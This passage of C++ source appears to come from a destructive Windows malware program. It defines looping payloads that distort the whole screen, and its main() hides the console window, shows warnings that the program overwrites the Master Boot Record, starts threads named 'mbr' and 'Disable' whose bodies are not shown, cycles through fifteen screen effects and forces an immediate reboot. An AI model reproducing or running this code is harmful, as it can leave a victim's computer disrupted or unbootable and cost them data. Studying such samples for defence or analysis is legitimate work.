	SystemMetrics = GetSystemMetrics(0);
	cy = GetSystemMetrics(1);
	memset(&pbmi, 0, sizeof(pbmi));
	ppvBits = 0i64;
	pbmi.bmiHeader.biSize = 44;
	pbmi.bmiHeader.biBitCount = 32;
	pbmi.bmiHeader.biPlanes = 1;
	pbmi.bmiHeader.biWidth = SystemMetrics;
	pbmi.bmiHeader.biHeight = cy;
	h = CreateDIBSection(hdc, &pbmi, 0, &ppvBits, 0i64, 0);
	SelectObject(hdcSrc, h);
	while (1)
	{
		hdc = GetDC(0i64);
		BitBlt(hdcSrc, 0, 0, SystemMetrics, cy, hdc, 0, 0, 0x330008u);
		for (i = 0; cy * SystemMetrics > i; ++i)
		{
			v5 = i % SystemMetrics;
			v4 = i / SystemMetrics;
			v3 = (i % cy) | (i / SystemMetrics);
			*((DWORD*)ppvBits + i) += (i / SystemMetrics ^ (i / SystemMetrics)) ^ (i % SystemMetrics * (i % SystemMetrics));
		}
		BitBlt(hdc, 0, 0, SystemMetrics, cy, hdcSrc, 0, 0, 0x330008u);
		ReleaseDC(0i64, hdc);
		DeleteDC(hdc);
	}
}
DWORD WINAPI payload12 (LPVOID lpParam) {
	BITMAPINFO pbmi; // [rsp+50h] [rbp-30h] BYREF
	void* ppvBits; // [rsp+80h] [rbp+0h] BYREF
	int v3; // [rsp+8Ch] [rbp+Ch]
	int v4; // [rsp+90h] [rbp+10h]
	int v5; // [rsp+94h] [rbp+14h]
	HGDIOBJ h; // [rsp+98h] [rbp+18h]
	int cy; // [rsp+A0h] [rbp+20h]
	int SystemMetrics; // [rsp+A4h] [rbp+24h]
	HDC hdcSrc; // [rsp+A8h] [rbp+28h]
	HDC hdc; // [rsp+B0h] [rbp+30h]
	int i; // [rsp+BCh] [rbp+3Ch]

	hdc = GetDC(0i64);
	hdcSrc = CreateCompatibleDC(hdc);
	SystemMetrics = GetSystemMetrics(0);
	cy = GetSystemMetrics(1);
	memset(&pbmi, 0, sizeof(pbmi));
	ppvBits = 0i64;
	pbmi.bmiHeader.biSize = 44;
	pbmi.bmiHeader.biBitCount = 32;
	pbmi.bmiHeader.biPlanes = 1;
	pbmi.bmiHeader.biWidth = SystemMetrics;
	pbmi.bmiHeader.biHeight = cy;
	h = CreateDIBSection(hdc, &pbmi, 0, &ppvBits, 0i64, 0);
	SelectObject(hdcSrc, h);
	while (1)
	{
		hdc = GetDC(0i64);
		BitBlt(hdcSrc, 0, 0, SystemMetrics, cy, hdc, 0, 0, 0x330008u);
		for (i = 0; cy * SystemMetrics > i; ++i)
		{
			v5 = i % SystemMetrics;
			v4 = i / SystemMetrics;
			v3 = (i % cy) | (i / SystemMetrics);
			*((DWORD*)ppvBits + i) += (i / SystemMetrics * (i / SystemMetrics)) & (i % SystemMetrics * (i % SystemMetrics));
		}
		BitBlt(hdc, 0, 0, SystemMetrics, cy, hdcSrc, 0, 0, 0x330008u);
		ReleaseDC(0i64, hdc);
		DeleteDC(hdc);
	}
}
DWORD WINAPI payload13 (LPVOID lpParam) {
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = screenWidth;
	bmpi.bmiHeader.biHeight = screenHeight;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	INT i = 0;
	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, NOTSRCCOPY);
		RGBQUAD rgbquadCopy;

		for (int x = 0; x < screenWidth; x++)
		{
			for (int y = 0; y < screenHeight; y++)
			{
				int index = y * screenWidth + x;

				int h = screenHeight;
				int w = screenWidth;
				INT Yii = y ^ y + i;
				INT Xii = x ^ x + i;
				INT Ssix = 6 * 10;
				INT Stwo = 2 * 10;
				FLOAT fx = (Xii + Yii) + (i + i * 10);

				rgbquadCopy = rgbquad[index];

				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 999.f + y / screenHeight * .99f, 99.f);

				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++;

		StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, NOTSRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}

	return 0x00;
}
DWORD WINAPI payload14 (LPVOID lpParam) {
	unsigned __int64 v0; // rax
	double X; // [rsp+68h] [rbp+8h]
	HDC hdc; // [rsp+88h] [rbp+28h]
	int wSrc; // [rsp+A4h] [rbp+44h]
	int hSrc; // [rsp+C4h] [rbp+64h]
	int v5; // [rsp+E4h] [rbp+84h]
	int v6; // [rsp+104h] [rbp+A4h]

	X = 0.0;
	while (1)
	{
		v0 = __rdtsc();
		hdc = GetDC(0i64);
		wSrc = GetSystemMetrics(0);
		hSrc = GetSystemMetrics(1);
		v5 = (int)(sin(X) * 50.0);
		v6 = (int)(cos(X) * 50.0);
		SetStretchBltMode(hdc, 3);
		StretchBlt(hdc, v5 / 2, v6 / 2, wSrc - v5, hSrc - v6, hdc, 0, 0, wSrc, hSrc, 0xCC0020u);
		X = X + 0.1963495408493621;
		DeleteObject(hdc);
		Sleep(0x32u);
	}
}
DWORD WINAPI payload15 (LPVOID lpParam) {
	unsigned __int64 v0; // rax
	int v1; // eax
	HDC hdc; // [rsp+28h] [rbp+8h]
	int SystemMetrics; // [rsp+44h] [rbp+24h]
	int v4; // [rsp+64h] [rbp+44h]
	HRGN hrgn; // [rsp+88h] [rbp+68h]
	int y2; // [rsp+154h] [rbp+134h]
	int x2; // [rsp+158h] [rbp+138h]
	int y1; // [rsp+15Ch] [rbp+13Ch]

	while (1)
	{
		v0 = __rdtsc();
		srand(v0);
		hdc = GetDC(0i64);
		SystemMetrics = GetSystemMetrics(0);
		v4 = GetSystemMetrics(1);
		y2 = rand() % v4;
		x2 = rand() % v4;
		y1 = rand() % v4;
		v1 = rand() % v4;
		hrgn = CreateEllipticRgn(v1 % SystemMetrics, y1, x2, y2);
		InvertRgn(hdc, hrgn);
		if (rand() % 2 == 1)
			InvalidateRect(0i64, 0i64, 0);
		DeleteObject(hdc);
		DeleteObject(hrgn);
		Sleep(1u);
	}
}
int main() {
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	if (MessageBoxW(NULL, L"Warning!!!\r\n"
		"This software is not recommended to run this on your real machine\r\n"
		"Because this software is not safe to run to your real computer, also\r\n"
		"it can damage your system and overwrite your bootloader or MBR\r\n"
		"(Master boot record) to make your computer unusable and to mulfunction.\r\n"
		"MBR or Master Boot Record is important file to boot up your computer,\r\n"
		"if you overwrite or format it, your computer will be unusable, and\r\n"
		"it will don't bootable again", L"MALWARE WARNING!!!", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
	{
		ExitProcess(0);
	}
	else
	{
		if (MessageBoxW(NULL, L"          LAST WARNING          \r\nTHE CREATORS ARE WILL BE NOT RESPONSIBLE FOR ANY DAMAGES!!!", L"THIS IS YOUR LAST WARNING!!!", MB_YESNO | MB_ICONWARNING) == IDNO)
		{
			ExitProcess(0);
		}
		else
		{
			HANDLE thread0 = CreateThread(0, 0, mbr, 0, 0, 0); //I think, it might be work
			HANDLE thread0dot1 = CreateThread(0, 0, Disable, 0, 0, 0);
			HANDLE thread1 = CreateThread(0, 0, payload1, 0, 0, 0);
			Sleep(15000);
			TerminateThread(thread1, 0);
			CloseHandle(thread1);
			InvalidateRect(0, 0, 0);
			HANDLE thread2 = CreateThread(0, 0, payload2, 0, 0, 0);
			Sleep(15000);
			TerminateThread(thread2, 0);
			CloseHandle(thread2);
			InvalidateRect(0, 0, 0);
			HANDLE thread3 = CreateThread(0, 0, payload3, 0, 0, 0);
			Sleep(30000);
			TerminateThread(thread3, 0);
			CloseHandle(thread3);
			InvalidateRect(0, 0, 0);
			Sleep(10);
			HANDLE thread4 = CreateThread(0, 0, payload4, 0, 0, 0);
			Sleep(30000);
			TerminateThread(thread4, 0);
			CloseHandle(thread4);
			InvalidateRect(0, 0, 0);
			HANDLE thread5 = CreateThread(0, 0, payload5, 0, 0, 0);
			Sleep(30000);
			TerminateThread(thread5, 0);
			CloseHandle(thread5);
			InvalidateRect(0, 0, 0);
			HANDLE thread6 = CreateThread(0, 0, payload6, 0, 0, 0);
			Sleep(30000);
			TerminateThread(thread6, 0);
			CloseHandle(thread6);
			InvalidateRect(0, 0, 0);
			HANDLE thread7 = CreateThread(0, 0, payload7, 0, 0, 0);
			Sleep(30000);
			TerminateThread(thread7, 0);
			CloseHandle(thread7);
			InvalidateRect(0, 0, 0);
			HANDLE thread8 = CreateThread(0, 0, payload8, 0, 0, 0);
			Sleep(30000);
			TerminateThread(thread8, 0);
			CloseHandle(thread8);
			InvalidateRect(0, 0, 0);
			HANDLE thread9 = CreateThread(0, 0, payload9, 0, 0, 0);
			Sleep(30000);
			TerminateThread(thread9, 0);
			CloseHandle(thread9);
			InvalidateRect(0, 0, 0);
			HANDLE thread10 = CreateThread(0, 0, payload10, 0, 0, 0);
			Sleep(30000);
			TerminateThread(thread10, 0);
			CloseHandle(thread10);
			InvalidateRect(0, 0, 0);
			HANDLE thread11 = CreateThread(0, 0, payload11, 0, 0, 0);
			Sleep(15000);
			TerminateThread(thread11, 0);
			CloseHandle(thread11);
			InvalidateRect(0, 0, 0);
			HANDLE thread12 = CreateThread(0, 0, payload12, 0, 0, 0);
			Sleep(30000);
			TerminateThread(thread12, 0);
			CloseHandle(thread12);
			InvalidateRect(0, 0, 0);
			Sleep(10);
			HANDLE thread13 = CreateThread(0, 0, payload13, 0, 0, 0);
			Sleep(30000);
			TerminateThread(thread13, 0);
			CloseHandle(thread13);
			InvalidateRect(0, 0, 0);
			HANDLE thread14 = CreateThread(0, 0, payload14, 0, 0, 0);
			Sleep(30000);
			TerminateThread(thread14, 0);
			CloseHandle(thread14);
			InvalidateRect(0, 0, 0);
			HANDLE thread15 = CreateThread(0, 0, payload15, 0, 0, 0);
			Sleep(30000);
			TerminateThread(thread15, 0);
			CloseHandle(thread15);
			InvalidateRect(0, 0, 0);
			system("C:\\Windows\\System32\\shutdown /r /t 0");
		}
	}
}
